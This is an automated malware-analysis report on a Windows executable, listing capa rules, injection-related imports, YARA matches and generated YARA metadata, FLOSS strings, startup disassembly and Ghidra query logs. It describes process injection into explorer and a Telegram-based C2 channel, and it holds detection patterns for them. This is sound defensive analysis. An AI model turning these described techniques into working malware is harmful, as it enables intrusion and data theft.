/* WARNING: Possible PIC construction at 0x000140001cac: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001e40: Changing call to branch */
/* WARNING: Possible PIC construction at 0x00014000204e: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001dde: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140002005: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f61: Changing call to branch */
/* WARNING: Possible PIC construction at 0x000140001f04: Changing call to branch */
/* WARNING: Removing unreachable block (ram,0x000140001f66) */
/* WARNING: Removing unreachable block (ram,0x00014000200a) */
/* WARNING: Removing unreachable block (ram,0x000140001de3) */
/* WARNING: Removing unreachable block (ram,0x000140001e45) */
/* WARNING: Removing unreachable block (ram,0x000140001e5b) */
/* WARNING: Removing unreachable block (ram,0x000140001cb5) */
/* WARNING: Removing unreachable block (ram,0x000140001cf0) */
/* WARNING: Removing unreachable block (ram,0x000140001d49) */
/* WARNING: Removing unreachable block (ram,0x000140001ec0) */
/* WARNING: Removing unreachable block (ram,0x000140001ec8) */
/* WARNING: Removing unreachable block (ram,0x00014000202b) */
/* WARNING: Removing unreachable block (ram,0x000140002036) */
/* WARNING: Removing unreachable block (ram,0x000140001d53) */
/* WARNING: Removing unreachable block (ram,0x000140001d5d) */
/* WARNING: Removing unreachable block (ram,0x000140001ed5) */
/* WARNING: Removing unreachable block (ram,0x000140001ede) */
/* WARNING: Removing unreachable block (ram,0x000140001d68) */
/* WARNING: Removing unreachable block (ram,0x000140002053) */
/* WARNING: Removing unreachable block (ram,0x000140002070) */
/* WARNING: Removing unreachable block (ram,0x000140002099) */
/* WARNING: Removing unreachable block (ram,0x000140001d74) */
/* WARNING: Removing unreachable block (ram,0x000140001dfd) */
/* WARNING: Removing unreachable block (ram,0x000140001f80) */
/* WARNING: Removing unreachable block (ram,0x000140002010) */
/* WARNING: Removing unreachable block (ram,0x000140001f8b) */
/* WARNING: Removing unreachable block (ram,0x000140001f9e) */
/* WARNING: Removing unreachable block (ram,0x000140001fac) */
/* WARNING: Removing unreachable block (ram,0x000140001fb4) */
/* WARNING: Removing unreachable block (ram,0x000140001df4) */
/* WARNING: Removing unreachable block (ram,0x000140001e19) */
/* WARNING: Removing unreachable block (ram,0x000140001d90) */
/* WARNING: Removing unreachable block (ram,0x000140001f28) */
/* WARNING: Removing unreachable block (ram,0x000140002020) */
/* WARNING: Removing unreachable block (ram,0x000140001f34) */
/* WARNING: Removing unreachable block (ram,0x000140001f40) */
/* WARNING: Removing unreachable block (ram,0x000140001f4e) */
/* WARNING: Removing unreachable block (ram,0x000140001f5a) */
/* WARNING: Removing unreachable block (ram,0x000140001d99) */
/* WARNING: Removing unreachable block (ram,0x000140001da2) */
/* WARNING: Removing unreachable block (ram,0x000140001fe0) */
/* WARNING: Removing unreachable block (ram,0x000140001daf) */
/* WARNING: Removing unreachable block (ram,0x000140001dcb) */
/* WARNING: Removing unreachable block (ram,0x000140001ff6) */
/* WARNING: Removing unreachable block (ram,0x000140001dd7) */
/* WARNING: Removing unreachable block (ram,0x000140001e1f) */
/* WARNING: Removing unreachable block (ram,0x00014000203f) */
/* WARNING: Removing unreachable block (ram,0x000140001e28) */
/* WARNING: Removing unreachable block (ram,0x000140001d84) */
/* WARNING: Removing unreachable block (ram,0x000140001f09) */
/* WARNING: Removing unreachable block (ram,0x000140001ef0) */
/* WARNING: Removing unreachable block (ram,0x000140001f20) */
/* WARNING: Removing unreachable block (ram,0x000140001e60) */
/* WARNING: Removing unreachable block (ram,0x00014
```

### Carved Files (1)
| Name | Type | Size |
|---|---|---|
| ? | PE | 342016 |

### Virtual Files (1)
| Path / Name | Unpacked Size | Type |
|---|---|---|
| MANIF/1/unk | 1167 | - |

### Structures (43)
| Name | EA |
|---|---|
| MZ | 0 |
| PE | 128 |
| OptionalHeader | 152 |
| Sections | 392 |
| TlsDirectory | 460416 |
| TlsCallbacks | 463328 |
| ExceptionTable | 464384 |
| ImportTable | 472576 |
| kernel32.OFT | 472776 |
| api-ms-win-crt-environment-l1-1-0.OFT | 473032 |
| api-ms-win-crt-heap-l1-1-0.OFT | 473048 |
| api-ms-win-crt-locale-l1-1-0.OFT | 473088 |
| api-ms-win-crt-math-l1-1-0.OFT | 473104 |
| api-ms-win-crt-private-l1-1-0.OFT | 473120 |
| api-ms-win-crt-runtime-l1-1-0.OFT | 473136 |
| api-ms-win-crt-stdio-l1-1-0.OFT | 473264 |
| api-ms-win-crt-string-l1-1-0.OFT | 473328 |
| kernel32.FT | 473376 |
| api-ms-win-crt-environment-l1-1-0.FT | 473632 |
| api-ms-win-crt-heap-l1-1-0.FT | 473648 |
| api-ms-win-crt-locale-l1-1-0.FT | 473688 |
| api-ms-win-crt-math-l1-1-0.FT | 473704 |
| api-ms-win-crt-private-l1-1-0.FT | 473720 |
| api-ms-win-crt-runtime-l1-1-0.FT | 473736 |
| api-ms-win-crt-stdio-l1-1-0.FT | 473864 |
| api-ms-win-crt-string-l1-1-0.FT | 473928 |
| ImportNames | 473976 |
| ImportNames | 475212 |
| ImportNames | 475232 |
| ImportNames | 475288 |


## capa Capability Rules
engine: `malcat-capa` · Total rules: 17 · duration_s: 1.09

| Rule | ATT&CK | MBC |
|---|---|---|
| encrypt data using RC4 PRGA | T1027:Obfuscated Files or Information | C0027.009:Encrypt Data, C0021.004:Generate Pseudo-random Sequence |
| get common file path | T1083:File and Directory Discovery | E1083:File and Directory Discovery |
| inject thread | T1055.003:Process Injection, T1620:Reflective Code Loading |  |
| enumerate processes | T1057:Process Discovery, T1518:Software Discovery |  |
| contain an embedded PE file |  | B0023:Install Additional Program |
| delete file |  | C0047:Delete File |
| write file on Windows |  | C0052:Writes File |
| allocate or change RWX memory |  | C0007:Allocate Memory |
| inject dll | T1055.001:Process Injection |  |
| terminate process |  | C0018:Terminate Process |
| create thread |  | C0038:Create Thread |
| link function at runtime on Windows | T1129:Shared Modules |  |
| enumerate PE sections |  | B0046.001:Code Discovery |
| parse PE header | T1129:Shared Modules |  |
| execute shellcode via indirect call |  | C0007:Allocate Memory |

## PE Imports / Signals
import_count: 66

| label | api_match | ATT&CK |
|---|---|---|
| allocate_memory | VirtualAllocEx | T1055 |
| write_process_memory | WriteProcessMemory | T1055 |
| create_remote_thread | CreateRemoteThread | T1055 |
| get_proc_address | GetProcAddress | T1129 |
| change_memory_protection | VirtualProtect | T1055 |

## YARA Matches (pipeline)
Total matches: 12

| Rule | Namespace | Match strings (trimmed) |
|---|---|---|
| domain | - | $domain_regex@0 len=2 |
| spyeye | - | $f@452832 len=8 |
| IP | - | $ipv4@124590 len=28; $ipv6@124914 len=6 |
| contains_base64 | - | $a@1600 len=12 |
| url | - | $url_regex@124032 len=56 |
| IsPE64 | - |  |
| IsWindowsGUI | - |  |
| HasOverlay | - |  |
| SEH__v4 | - | $@592021 len=12 |
| inject_thread | - | $c1@465120 len=11; $c2@465220 len=14; $c4@465322 len=18; $c5@464790 len=18; $c6@150610 len=12; $c7@465120 len=11 |
| screenshot | - | $d1@152012 len=9; $d2@152784 len=10; $c1@150226 len=6; $c2@151934 len=5 |
| win_mutex | - | $c1@150576 len=11 |

## Generated YARA Meta
```json
{
  "sha256": "28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9",
  "family": "unknown",
  "generated_at": "2026-08-05T05:26:10.691039+00:00",
  "string_count": 24,
  "strings": [
    "_ZNK10__cxxabiv120__si_class_type_info12__do_dyncastExNS_17__class_type_info10__sub_kindEPKS1_PKvS4_S6_RNS1_16__dyncast_resultE",
    ".xdata$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE",
    ".pdata$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE",
    ".text$_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE",
    ".xdata$_ZNK10__cxxabiv120__si_class_type_info11__do_upcastEPKNS_17__class_type_infoEPKvRNS1_15__upcast_resultE",
    ".pdata$_ZNK10__cxxabiv120__si_class_type_info11__do_upcastEPKNS_17__class_type_infoEPKvRNS1_15__upcast_resultE",
    ".text$_ZNK10__cxxabiv120__si_class_type_info11__do_upcastEPKNS_17__class_type_infoEPKvRNS1_15__upcast_resultE",
    "_ZNK10__cxxabiv117__class_type_info12__do_dyncastExNS0_10__sub_kindEPKS0_PKvS3_S5_RNS0_16__dyncast_resultE",
    "_ZNK10__cxxabiv120__si_class_type_info11__do_upcastEPKNS_17__class_type_infoEPKvRNS1_15__upcast_resultE",
    ".xdata$_ZNK10__cxxabiv120__si_class_type_info20__do_find_public_srcExPKvPKNS_17__class_type_infoES2_",
    ".pdata$_ZNK10__cxxabiv120__si_class_type_info20__do_find_public_srcExPKvPKNS_17__class_type_infoES2_",
    ".text$_ZNK10__cxxabiv120__si_class_type_info20__do_find_public_srcExPKvPKNS_17__class_type_infoES2_",
    "_ZNK10__cxxabiv120__si_class_type_info20__do_find_public_srcExPKvPKNS_17__class_type_infoES2_",
    "2GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    "*GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    "GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    ":GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    ";GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    ".GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    "?GNU C99 16.1.0 -m64 -masm=att -mtune=generic -march=nocona -g -O2 -std=gnu99 -fno-builtin",
    "Confirms the sample is a 64-bit PE with 98 entropy (indicative of packing/obfuscation), 5 anomalies including XorInLoop ",
    "These are core process injection APIs mapped to ATT&CK T1055 (Process Injection), a common malware behavior for executin",
    "Shows the sample generates a temp DLL path (%s\\dl%lu.dll), writes an embedded payload to the file, locates the explorer.",
    "This is a known Telegram Bot API C2 endpoint, indicating the sample uses Telegram for command and control communications"
  ],
  "rule_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yar",
  "sigma_path": "/opt/samples/logs/28ea44a49cb4277edb82609efa4af573d953cdaa77a1973e3e7fc412b97450a9/rule.yml",
  "yara_valid": true,
  "yara_check": "ok",
  "goodware_fp": {
    "goodware_dir": "/opt/samples/goodware",
    "fp_count": 0,
    "fp_samples": [],
    "skipped": "goodware corpus not staged"
  },
  "yargen": {
    "skipped": true
  },
  "revai": true,
  "publish_target": "revai_publish"
}
```

## FLOSS Strings
Total strings: 7006 · per_category: `{"decoded_strings": 0, "stack_strings": 0, "tight_strings": 0, "language_strings": 0, "language_strings_missed": 0, "static_strings": 7006}`

### FLOSS sample
- `!This program cannot be run in DOS mode.`
- ``.data`
- `.rdata`
- `@.pdata`
- `@.xdata`
- `.idata`
- `@.reloc`
- `=CCG u`
- `AWAVAUATUWVSH`
- `X[^_]A\A]A^A_`
- `8MZuJHcP<H`
- `AVWVSH`
- `UAVAUATWVSH`
- `[^_A\A]A^]`
- `([^_]H`
- `@' t	H`
- `.edata`
- `@.idata`
- `.reloc`
- `AVATUWVS`
- `TestpassI`
- `[^_]A\A^A_`
- `h;\$Xs#I`
- `J(A;J,}4Hc`
- `I(D;I,}FIc`
- `<_t`<ntT`
- `R(A;R,}-Hc`
- `ATUWVSH`
- `P[^_]A\`
- `_GLOBAL_H9`
- `BHA;R,}VHc`
- `C8;C<|`
- `X[^_A^`
- `0[^_]A\`
- `R(A;R,}`
- `AVUWVSH`
- `P[^_]A^`
- `U(;U,}:Hc`
- `<Et6<Qt2H`
- `D$0<Qt@H`

## .NET Analysis
- is_dotnet: false (not observed)

## radare2 Disassembly (attach in Static Code Analysis)
### 0x140001440
```asm
╎   ;-- WinMainCRTStartup:
┌ 18: entry0 ();
│       ╎   0x140001440      488b05c9ff..   mov rax, qword [0x140071410] ; synchapi.h:136:0 ; [0x140071410:8]=0x140074090
│       ╎   0x140001447      c70001000000   mov dword [rax], 1
└       └─< 0x14000144d      e9eefbffff     jmp sym.__tmainCRTStartup  ; synchapi.h:138:0
```
### 0x140001000
```asm
;-- section..text:
            ; DATA XREF from sym.__tmainCRTStartup @ 0x1400011a0(r)
┌ 1: sym.__mingw_invalidParameterHandler ();
└           0x140001000      c3             ret                        ; synchapi.h:88:0 ; [00] -r-x section size 8192 named .text
```
### 0x140001010
```asm
; DATA XREF from sym.__tmainCRTStartup @ 0x14000139c(r)
┌ 31: sym.cpp_unhandled_exception_filter (int64_t arg1);
│           ; arg int64_t arg1 @ rcx
│           0x140001010      31d2           xor edx, edx               ; synchapi.h:103:0
│           0x140001012      488b09         mov rcx, qword [rcx]       ; synchapi.h:118:0 ; arg1
│           0x140001015      8b01           mov eax, dword [rcx]       ; arg1
│           0x140001017      25ffffff20     and eax, 0x20ffffff
│           0x14000101c      3d43434720     cmp eax, 0x20474343        ; 'CCG '
│       ┌─< 0x140001021      7509           jne 0x14000102c
│       │   0x140001023      8b5104         mov edx, dword [rcx + 4]   ; synchapi.h:119:0 ; arg1
│       │   0x140001026      83e201         and edx, 1
│       │   0x140001029      83ea01         sub edx, 1                 ; synchapi.h:118:0
│       └─> 0x14000102c      89d0           mov eax, edx               ; synchapi.h:123:0
└           0x14000102e      c3             ret
```
### 0x140001030
```asm
; DATA XREF from sym.__tmainCRTStartup @ 0x140001185(r)
┌ 7: sym.safe_flush ();
│           0x140001030      31c9           xor ecx, ecx               ; synchapi.h:127:0
└       ┌─< 0x140001032      e9b1190000     jmp sym.fflush             ; synchapi.h:129:0
```
### 0x140001040
```asm
┌ 980: sym.__tmainCRTStartup (int64_t arg_1h);
│           ; arg int64_t arg_1h @ rbp+0x1
│           ; var int64_t var_20h @ rsp+0x20
│           ; var int64_t var_3ch @ rsp+0x3c
│           ; var int64_t var_4ch @ rsp+0x4c
│           0x140001040      4157           push r15                   ; synchapi.h:157:0
│           0x140001042      4156           push r14
│           0x140001044      4155           push r13
│           0x140001046      4154           push r12
│           0x140001048      55             push rbp
│           0x140001049      57             push rdi
│           0x14000104a      56             push rsi
│           0x14000104b      53             push rbx
│           0x14000104c      4883ec58       sub rsp, 0x58
│           0x140001050      65488b0425..   mov rax, qword gs:[0x30]   ; synchapi.h:167:0
│           0x140001059      488b7008       mov rsi, qword [rax + 8]   ; synchapi.h:175:0
│           0x14000105d      488b1dec03..   mov rbx, qword [0x140071450] ; synchapi.h:176:0 ; [0x140071450:8]=0x140074040
│           0x140001064      488b3d6543..   mov rdi, qword [sym.imp.KERNEL32.dll_Sleep] ; synchapi.h:187:0 ; [0x1400753d0:8]=0x7572c reloc.KERNEL32.dll_Sleep ; ",W\a"
│       ┌─< 0x14000106b      eb13           jmp 0x140001080            ; synchapi.h:179:0
..
│      ┌──> 0x140001070      4839c6         cmp rsi, rax               ; synchapi.h:182:0
│     ┌───< 0x140001073      0f84af000000   je 0x140001128
│     │╎│   0x140001079      b9e8030000     mov ecx, 0x3e8             ; synchapi.h:187:0 ; 1000
│     │╎│   0x14000107e      ffd7           call rdi
│     │╎│   ; CODE XREF from sym.__tmainCRTStartup @ 0x14000106b(x)
│     │╎└─> 0x140001080      31c0           xor eax, eax               ; synchapi.h:180:0
│     │╎    0x140001082      f0480fb133     lock cmpxchg qword [rbx], rsi
│     │└──< 0x140001087      75e7           jne 0x140001070
│     │     0x140001089      4531f6         xor r14d, r14d             ; synchapi.h:176:0
│     │     ; CODE XREF from sym.__tmainCRTStartup @ 0x14000112e(x)
│     │ ┌─> 0x14000108c      4c8b25cd03..   mov r12, qword [str.H__a_] ; synchapi.h:189:0 ; [0x140071460:8]=0x140074048 ; "H@\a@\x01"
│     │ ╎   0x140001093      41833c2401     cmp dword [r12], 1
│     │┌──< 0x140001098      0f848c030000   je 0x14000142a
│     ││╎   0x14000109e      458b1c24       mov r11d, dword [r12]      ; synchapi.h:193:0
│     ││╎   0x1400010a2      4585db         test r11d, r11d
│    ┌────< 0x1400010a5      0f84b5000000   je 0x140001160
│    │││╎   0x1400010ab      c7054f2f07..   mov dword [0x140074004], 1 ; synchapi.h:264:0 ; [0x140074004:4]=0
│    │││╎   ; CODE XREF from sym.__tmainCRTStartup @ 0x1400013d0(x)
│   ┌─────> 0x1400010b5      4585f6         test r14d, r14d            ; synchapi.h:265:0
│  ┌──────< 0x1400010b8      0f8492000000   je 0x140001150
│  │╎│││╎   ; CODE XREF from sym.__tmainCRTStartup @ 0x140001155(x)
│ ┌───────> 0x1400010be      488b051b03..   mov rax, qword [0x1400713e0] ; synchapi.h
```

## UPX Unpack
- upx_ok: False
- is_packed: False
- returncode: None
- unpacked_path: ``

## XOR Search
- Found XOR 00 position 00000000: 00000080 ........!..L.!This program cannot be r
- Found XOR 00 position 00002420: 00000080 ........!..L.!This program cannot be r

## Speakeasy (dynamic)
- speakeasy_ok: True
- api_calls: 0
- key_events: 0
- duration_s: None
- **not observed**: no API calls/events recorded — do not invent runtime behavior

## Frida Probe
- frida_available: True
- version: 17.16.4
- hook_candidates:
  - `KERNEL32.dll!CloseHandle`
  - `KERNEL32.dll!CreateFileW`
  - `KERNEL32.dll!CreateRemoteThread`
  - `KERNEL32.dll!CreateToolhelp32Snapshot`
  - `KERNEL32.dll!DeleteCriticalSection`
  - `api-ms-win-crt-environment-l1-1-0.dll!__p__environ`
  - `api-ms-win-crt-heap-l1-1-0.dll!_set_new_mode`
  - `api-ms-win-crt-heap-l1-1-0.dll!calloc`
  - `api-ms-win-crt-heap-l1-1-0.dll!free`
  - `api-ms-win-crt-heap-l1-1-0.dll!malloc`
  - `api-ms-win-crt-locale-l1-1-0.dll!_configthreadlocale`
  - `api-ms-win-crt-math-l1-1-0.dll!__setusermatherr`
  - `api-ms-win-crt-private-l1-1-0.dll!memcpy`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p___argc`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p___argv`
  - `api-ms-win-crt-runtime-l1-1-0.dll!__p__acmdln`
  - `api-ms-win-crt-runtime-l1-1-0.dll!_cexit`
  - `api-ms-win-crt-runtime-l1-1-0.dll!_configure_narrow_argv`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__acrt_iob_func`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__p__commode`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__p__fmode`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vfprintf`
  - `api-ms-win-crt-stdio-l1-1-0.dll!__stdio_common_vswprintf`
  - `api-ms-win-crt-string-l1-1-0.dll!_stricmp`
  - `api-ms-win-crt-string-l1-1-0.dll!memset`
  - `api-ms-win-crt-string-l1-1-0.dll!strlen`
  - `api-ms-win-crt-string-l1-1-0.dll!strncmp`
  - `api-ms-win-crt-string-l1-1-0.dll!wcslen`

## Audit Trail (recent)
- `{"source": "ghidra_query", "sql": "SELECT COUNT(1) AS cnt FROM strings", "ts": 1785907341.1158571}`
- `{"source": "ghidra_query", "sql": "SELECT count(*) AS funcs FROM funcs", "ts": 1785907395.9968445}`
- `{"source": "ghidra_query", "sql": "SELECT count(*) AS strings FROM strings", "ts": 1785907396.1618755}`
- `{"source": "ghidra_query", "sql": "SELECT name, address FROM data_items WHERE name LIKE 'PTR_%' LIMIT 50", "ts": 1785907396.5031404}`
- `{"source": "ghidra_query", "sql": "SELECT address, substr(content, 1, 100) AS s FROM strings WHERE content LIKE '%crypt%' OR content LIKE '%.dll' OR content LIKE '%http%' LIMIT 30", "ts": 1785907396.6065526}`
- `{"source": "quick_scan_v2", "phase": 2, "ts": 1785907396.6087034}`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs ORDER BY size DESC LIMIT 25", "ts": 1785907464.5570452}`
- `{"source": "ghidra_query", "sql": "SELECT func_name, func_addr, size, instruction_count, cyclomatic_complexity, call_out_count, string_ref_count FROM function_metrics ORDER BY cyclomatic_complexity DESC LIMIT 20", "ts": 1785907470.1104634}`
- `{"source": "ghidra_query", "sql": "SELECT content, address, length FROM strings WHERE content LIKE '%http%' OR content LIKE '%.exe' OR content LIKE '%cmd%' OR content LIKE '%powershell%' OR content LIKE '%rundll%' OR content LIKE '%reg%' OR content LIKE '%mutex%' OR content LIKE '%inject%' OR conten`
- `{"source": "ghidra_query", "sql": "SELECT name, module, address FROM imports WHERE module IN ('advapi32.dll', 'kernel32.dll', 'ws2_32.dll', 'wininet.dll', 'crypt32.dll', 'user32.dll', 'gdi32.dll', 'shell32.dll', 'ole32.dll', 'oleaut32.dll') ORDER BY module, name", "ts": 1785907470.2502615}`
- `{"source": "ghidra_query", "sql": "SELECT name, module, address FROM imports ORDER BY module, name LIMIT 200", "ts": 1785907474.3668969}`
- `{"source": "ghidra_query", "sql": "SELECT DISTINCT module FROM imports ORDER BY module", "ts": 1785907489.8798053}`
- `{"source": "ghidra_query", "sql": "SELECT func_name, func_addr, string_value, string_addr, string_length FROM string_refs WHERE string_value LIKE '%curl%' OR string_value LIKE '%telegram%' OR string_value LIKE '%BeaconMutex%' OR string_value LIKE '%sendDocument%' OR string_value LIKE '%proxy%' OR st`
- `{"source": "ghidra_query", "sql": "SELECT name, address FROM imports WHERE module = 'KERNEL32.DLL' ORDER BY name", "ts": 1785907495.506852}`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs WHERE name LIKE '%inject%' OR name LIKE '%screenshot%' OR name LIKE '%mutex%' OR name LIKE '%curl%' OR name LIKE '%telegram%' OR name LIKE '%exfil%' OR name LIKE '%http%' OR name LIKE '%send%' OR name LIKE '%recv%' OR name LIKE`
- `{"source": "ghidra_query", "sql": "SELECT * FROM callgraph_edges LIMIT 5", "ts": 1785907507.218766}`
- `{"source": "ghidra_query", "sql": "SELECT func_name, func_addr, string_value, string_addr, string_length FROM string_refs WHERE string_addr IN (5368836128, 5368836224, 5368836382, 5368836416, 5368836844) LIMIT 50", "ts": 1785907511.195792}`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs WHERE address >= 5368714576 AND address <= 5368721000 ORDER BY address", "ts": 1785907511.1997914}`
- `{"source": "ghidra_query", "sql": "SELECT from_ea, to_ea, is_code FROM xrefs WHERE to_ea IN (5368836128, 5368836224, 5368836382, 5368836416, 5368836844) LIMIT 50", "ts": 1785907519.4887512}`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs WHERE address >= 5368835000 AND address <= 5368838000 ORDER BY address", "ts": 1785907519.493317}`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs WHERE name NOT LIKE '._*' AND name NOT LIKE '__*' AND name NOT LIKE '.*' AND name NOT LIKE 'safe_*' AND name NOT LIKE '___*' AND name NOT LIKE '___w64*' AND name NOT LIKE '__mingw*' AND name NOT LIKE '__do_*' AND name NOT LIKE `
- `{"source": "ghidra_query", "sql": "SELECT func_name, func_addr, string_value, string_addr, string_length FROM string_refs WHERE string_value LIKE '%curl%' OR string_value LIKE '%telegram%' OR string_value LIKE '%BeaconMutex%' OR string_value LIKE '%sendDocument%' OR string_value LIKE '%proxy%' OR st`
- `{"source": "ghidra_query", "sql": "SELECT func_name, func_addr, size, instruction_count, cyclomatic_complexity, call_out_count, string_ref_count FROM function_metrics WHERE string_ref_count > 0 ORDER BY string_ref_count DESC LIMIT 20", "ts": 1785907528.9131203}`
- `{"source": "ghidra_query", "sql": "SELECT content, address, length FROM strings WHERE content LIKE '%BeaconMutex%' OR content LIKE '%telegram%' OR content LIKE '%sendDocument%' OR content LIKE '%curl%' OR content LIKE '%proxy%' OR content LIKE '%chat_id%' OR content LIKE '%application/octet-stream%'`
- `{"source": "ghidra_query", "sql": "SELECT start_ea, end_ea, name, class, size, is_read, is_write, is_exec FROM memory_blocks ORDER BY start_ea", "ts": 1785907535.3172398}`
- `{"source": "ghidra_query", "sql": "SELECT from_ea, to_ea, is_code FROM xrefs WHERE to_ea = 5368836128 OR to_ea = 5368836224 OR to_ea = 5368836382 OR to_ea = 5368836416 OR to_ea = 5368836844 LIMIT 50", "ts": 1785907535.324119}`
- `{"source": "ghidra_query", "sql": "SELECT content, address, length FROM strings WHERE content LIKE '%screenshot%' OR content LIKE '%keylog%' OR content LIKE '%inject%' OR content LIKE '%VirtualAlloc%' OR content LIKE '%WriteProcessMemory%' OR content LIKE '%CreateRemoteThread%' OR content LIKE '%Win`
- `{"source": "ghidra_query", "sql": "SELECT name, address, size FROM funcs WHERE name LIKE '%SendToTelegram%' OR name LIKE '%exfil%' OR name LIKE '%upload%' OR name LIKE '%download%' OR name LIKE '%http%' OR name LIKE '%curl%' OR name LIKE '%telegram%' OR name LIKE '%bot%' OR name LIKE '%c2%' OR name `
- `{"source": "ghidra_query", "sql": "SELECT content FROM strings WHERE length(content) >= 8 ORDER BY length(content) DESC LIMIT 80", "ts": 1785907569.652957}`
- `{"source": "yara_gen_v2", "ts": 1785907570.691185}`
